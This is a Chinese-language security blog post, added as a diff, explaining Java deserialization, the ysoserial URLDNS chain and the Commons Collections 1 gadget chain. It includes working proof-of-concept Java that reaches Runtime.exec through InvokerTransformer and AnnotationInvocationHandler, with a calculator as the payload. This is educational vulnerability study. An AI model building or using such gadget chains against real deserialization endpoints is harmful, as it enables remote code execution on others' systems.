@@ -1,0 +1,389 @@
+---
+title: Java 反序列化
+date: 2024-09-08
+tags:
+  - JAVA
+  - SEC
+draft: false
+images: ['/static/images/blog/2024/0e67d6/Pasted%20image%2020250204125405.png']
+authors: ['default']
+---
+
+# 基础
+
+## Java 与 PHP 反序列化区别
+
+Java 相对 PHP 序列化更深入的地方在于，其提供了更加高级、灵活地方法 `writeObject` ，允许开发者在序列化流中**插入一些自定义数据**，进而在反序列化的时候能够使用 `readObject` 进行读取。
+
+当然，PHP中也提供了一个魔术方法叫 `__wakeup` ，在反序列化的时候进行触发。很多人会认为Java的 `readObject` 和PHP的 `__wakeup` 类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决的问题稍微有些差异：
+
+- `readObject` 倾向于解决“反序列化时如何**还原一个完整对象**”的问题
+- `__wakeup` 更倾向于解决“反序列化**后**如何**初始化**这个对象”的问题
+
+这个微小差异是 Java 的反序列化漏洞这么多的本质原因。
+
+Java反序列化的操作，很多是需要开发者深入参与的，所以你会发现大量的库会实现 `readObject` `writeObject` 方法，这和PHP中 `__wakeup  __sleep` 很少使用是存在鲜明对比的。
+
+---
+
+## 序列化 writeObject
+
+写个示例的 person 类：
+
+```java
+import java.io.IOException;
+
+public class Person implements java.io.Serializable {
+	public String name;
+	public int age;
+
+	Person(String name, int age) {
+		this.name = name;
+		this.age = age;
+	}
+
+	private void writeObject(ObjectOutputStream s) throws IOException {
+	    // 1. 先调用默认序列化，处理所有非transient字段
+	    s.defaultWriteObject();
+	    // 2. 写入额外数据
+	    s.writeObject("This is a object");
+	}
+
+	private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
+		s.defaultReadObject();
+		String message = (String) s.readObject();
+		System.out.println(message);
+	}
+}
+```
+
+1. `Serializable` 这个接口不包含方法，属于**标记接口**，JVM 通过这个标记识别类是否可以序列化。
+2. `write/readObject` 方法必须是 private，因为它们不应被外部代码直接调用，而是由序列化机制调用，详见后文。
+
+### ObjectOutputStream类
+
+- OOS 是 Person 类中定义 writeObject 方法的参数，但 `Person.writeObject` **不能被直接调用**，需要通过 OOS 类调用。
+
+Java 序列化需要由 `ObjectOutputStream` 调用 `writeObject` 方法，参数是需要被序列化的对象。
+
+### 重点：序列化调用机制解析
+
+当执行以下代码：
+
+```java
+ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("object.dat"));
+oos.writeObject(obj);
+```
+
+1. `writeObject(obj)` 会检查 obj 的类是否实现了 `Serializable` 接口。
+2. 如果该类实现了 `Serializable`，Java 序列化机制会进一步检查该类中是否定义了一个名为 `writeObject` 的方法，且方法签名为：
+   ```java
+   private void writeObject(ObjectOutputStream s) throws IOException
+   ```
+3. 如果存在这个方法，序列化机制会调用它，并传入 `ObjectOutputStream` 作为参数。
+   如果该方法不存在，Java 会使用默认的序列化逻辑（即直接序列化对象的所有非 `transient` 字段）。
+
+**再次强调**：
+
+- `writeObject` 不是普通的类的方法，不可以直接用 `类.方法` 的方式调用。
+- `oos.writeObject` 会**自动**找到并调用 Person 类自定义的那个 `writeObject` 方法
+
+```java
+// wrong！: person.writeObject(oos);
+oos.writeObject(person);
+```
+
+---
+
+## 反序列化 readObject
+
+调用 `readObject` 不需要参数，返回值是反序列得到的对象。
+
+```java
+// 反序列化
+ObjectInputStream ois = new ObjectInputStream(new FileInputStream("person.dat"));
+Person deserializedPerson = (Person) ois.readObject();
+ois.close();
+```
+
+---
+
+# 实战
+
+## 利用链
+
+- Java 反序列化漏洞的难点不在于发现，而在于如何利用
+
+为了完成最终的危险操作，实战中的反序列化攻击往往需要结合很多 serialize 接口，形成复杂的调用链，这一过程非常繁琐。
+
+著名 Java 反序列化利用工具 ysoserial 集成了很多利用链，可以直接使用。
+
+```bash
+java -jar ysoserial-all.jar
+```
+
+### ysoserial 的 payloads
+
+稍微解释一下 ysoserial 源码中的 payloads 文件夹，之后分析利用链会用到。
+
+payloads 文件夹中每个文件就是一个 payload （一个公共类），每个 payload 类中都会定义一个`getObject` 方法，这个方法会返回一个**对应 payload 的对象**，该对象会在之后被 ysoserial 工具进一步处理，最终生成**序列化的字节流**。
+
+![](/static/images/blog/2024/0e67d6/Pasted%20image%2020250123194017.png)
+
+另外，每个 payload 文件（比如后文调试了 URLDNS.java ），都会写一个 main：
+
+![](/static/images/blog/2024/0e67d6/Pasted%20image%2020250123194916.png)
+
+其中这个 `PayloadRunner.run` 会干3件事：
+
+1. 调用 `getObject`
+2. 生成序列化数据作为输出的 payload
+3. 本地反序列化测试生成的 payload 是否有效
+
+所以，可以单独调试一个 payload.java 文件，来看这个 payload 实际反序列触发利用的过程。
+
+---
+
+## URLDNS 链
+
+参数是一个 URL，结果是触发⼀次 DNS 请求。
+
+优点：
+
+- 使⽤ Java 内置的类构造，对第三⽅库**没有依赖**
+- 在⽬标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞
+
+### 调用链
+
+从第一个 readObject 的反序列化进入，顺着函数中其他方法找下去，最终找到一个可能造成危害的函数进行注入利用。（建议直接看源码分析）
+
+```java
+ *     HashMap.readObject()
+ *       HashMap.putVal()
+ *         HashMap.hash()
+ *           URL.hashCode()
+```
+
+### 源码分析
+
+从 ysoserial payloads 中的 `URLDNS.java` 一步步调试分析。
+
+反序列化的入口点是 `HashMap.readObject()`，直接去看这个函数，其中 `hash`函数是关键的利用点，先打个断点，开始调试：
+
+![](/static/images/blog/2024/0e67d6/Pasted%20image%2020250123175832.png)
+
+- 注意，之前讲到 payload 文件主函数的 `PayloadRunner` 会干三件事，这边断点拦截到的是第三件事：反序列化，反序列化一定会触发 `readObject`。
+
+步入 `hash` ：
+
+![](/static/images/blog/2024/0e67d6/Pasted%20image%2020250123175916.png)
+
+步入 `hashCode`:
+
+![](/static/images/blog/2024/0e67d6/Pasted%20image%2020250123180030.png)
+
+步入 `handler.hashCode`：
+
+![](/static/images/blog/2024/0e67d6/Pasted%20image%2020250123180129.png)
+
+步入 `getHostAddress`：
+
+![](/static/images/blog/2024/0e67d6/Pasted%20image%2020250123180225.png)
+
+最终找到 `InetAddress.getByName(host)` ，这个方法进行了 DNS 查询操作。
+
+单步执行之后可以在反连平台看到 DNS 查询：
+
+![](/static/images/blog/2024/0e67d6/Pasted%20image%2020250123180534.png)
+
+URL 类的 hashCode 很简单。如果 hashcode 不为 -1，则返回 hashcode。在序列化构造 payload 的时候，需要设置 hashcode 为 -1 的原因，就是防止进入到 `hashcode` 方法中，进而发送 DNS 请求，影响判断。
+
+---
+
+## Commons Collections 1
+
+### Transformer
+
+什么是 Transformer，可以用下面的例子理解：
+
+```java
+public class TransformedMapExample {
+    public static void main(String[] args) {
+        // 原始 Map
+        Map<String, Integer> originalMap = new HashMap<>();
+        originalMap.put("keyone", 1);
+        originalMap.put("keytwo", 2);
+
+        // 定义键和值的转换器
+        Transformer<String, String> keyTransformer = input -> input.toUpperCase();
+        Transformer<Integer, Integer> valueTransformer = input -> input * 10;
+
+        // 创建 TransformedMap
+        Map<String, Integer> transformedMap = TransformedMap.decorate(originalMap, keyTransformer,
+                valueTransformer);
+
+        // 添加新元素，自动应用转换
+        transformedMap.put("keythree", 4);
+
+        // 输出转换后的 Map
+        System.out.println(transformedMap);
+    }
+}
+```
+
+- 最后输出转换后的 map（transformedMap ），键变为大写，值变为10倍。
+
+`Transformer` 是一个接口，用于实现转换器的功能，定义如下：
+
+```java
+public interface Transformer {
+	public Object transform(Object input);
+}
+```
+
+在例子中：
+
+```java
+Transformer<String, String> keyTransformer = input -> input.toUpperCase();
+```
+
+使用 Lambda 表达式**实现**了 `Transformer` 这个函数式接口，实现了一个大写转换的功能。
+
+- 注意，不是实例化，接口不能实例化（不能 new），可以实现
+
+`TransformedMap.decorate` 方法用于修饰原来的map：
+
+- 参数1是原始map
+- 参数23是转换方法，可以传入单个方法 或者 链 或者 NULL
+
+最后，使用 `decorate` 方法为原map的键和值加上两个转换器，得到一个 transformedMap。
+
+---
+
+### 最简 CC1 demo
+
+- from Phith0n
+
+```java
+package com.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.util.HashMap;
+import java.util.Map;
+
+public class Main {
+    public static void main(String[] args) {
+
+        Transformer[] transformers = new Transformer[]{
+            new ConstantTransformer(Runtime.getRuntime()),
+            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        Map innerMap = new HashMap();
+        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+        outerMap.put("test", "1234");
+    }
+}
+```
+
+这里有三个实现了 `Transformer` 接口的类：
+
+1. `ConstantTransformer` ：调用 `transform` ⽅法时，将传入的对象（常量）返回。
+2. `InvokerTransformer`：执⾏任意⽅法
+3. `ChainedTransformer`：将内部的多个 Transformer串在⼀起，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，形成一个依次执行很多 transform 方法的链子 。
+
+用 `ChainedTransformer` 的实例作为转换器，修饰原来的map，这样当我们调用修饰过的map的 put 方法时，就可以触发 `ChainedTransformer` 这个转换器，执行链中一系列的 transform 方法之后，达到执行命令的目的。
+
+### 真正的 CC1
+
+#### AnnotationInvocationHandler
+
+- Java 8u66，注意这一节的POC在8u71及之后的版本中无法复现
+
+触发CC1的核心在于向修饰过的map添加新元素，前面最简demo中我们直接调用了put方法作为演示，但是实战中一般没有这个方法，在实际反序列化时，我们需要找到一个类，**它在反序列化的readObject逻辑里有类似的写入操作**，CC1中这个类是 AnnotationInvocationHandler。
+
+![](/static/images/blog/2024/0e67d6/Pasted%20image%2020250204155654.png)
+
+- readObject 中有 setValue 方法
+
+于是，我们可以接着上一节的最简demo继续写：
+
+```java
+Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
+construct.setAccessible(true);
+Object obj = construct.newInstance(Retention.class, outerMap);
+
+ByteArrayOutputStream bos = new ByteArrayOutputStream();
+ObjectOutputStream oos = new ObjectOutputStream(bos);
+oos.writeObject(obj);
+oos.close();
+```
+
+#### NotSerializableException
+
+但是运行之后，我们会发现：
+
+```bash
+Exception in thread "main" java.io.NotSerializableException: java.lang.Runtime
+```
+
+Runtime 类出现了 NotSerializableException 的错误，这是因为这个类本身没有实现序列化接口java.io.Serializable 。
+
+> 在 Java 中，**不是所有对象都支持序列化**，待序列化的对象和所有它使用的内部属性对象，必须都实现了 java.io.Serializable 接口。
+
+那么如何绕过这个错误呢？我们可以通过**反射**来获取 Runtime 对象，而不需要直接使用这个类，思路上来说，就是要避免 Runtime 类参与序列化的过程。
+
+所以我们应该把 demo 中的 transformers 改成反射的形式：
+
+```java
+Transformer[] transformers = new Transformer[]{
+	new ConstantTransformer(Runtime.class),
+	new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
+	new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
+	new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
+};
+```
+
+但是仍然不行。
+
+动态调试发现此处 var7 == NULL 从而跳过了 setvalue：
+
+![](/static/images/blog/2024/0e67d6/Pasted%20image%2020250204161421.png)
+
+使得 var7 不为 NULL 有以下两个条件：
+
+1. 构造函数的第一个参数必须是 Annotation 的子类，且其中必须含有至少一个方法，假设方法名是X
+2. 被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素
+
+而之前作为构造函数参数的 Retention 有一个方法，名为value；所以，为了再满足第二个条件，需要给 Map 中放入一个 Key 是 value 的元素：
+
+![](/static/images/blog/2024/0e67d6/Pasted%20image%2020250204161915.png)
+
+这样就可以成功执行了。
+
+#### 高版本无法执行
+
+在 Java 8u71及之后的版本中，AnnotationInvocationHandler 作了如下修改：
+
+![](/static/images/blog/2024/0e67d6/Pasted%20image%2020250204125405.png)
+
+简单来说，对 Map 的操作都是基于一个新的 LinkedHashMap 对象，而原来我们精心构造的 Map 不再执行 set 或 put 操作，也就不会触发 RCE 了。
+
+---
+
+## 经典漏洞
+
+- [[Shiro 反序列化漏洞]]
+
+---
+
+## 参考
+
+- [Java安全漫谈 - 『代码审计』知识星球](https://govuln.com/docs/java-things/)
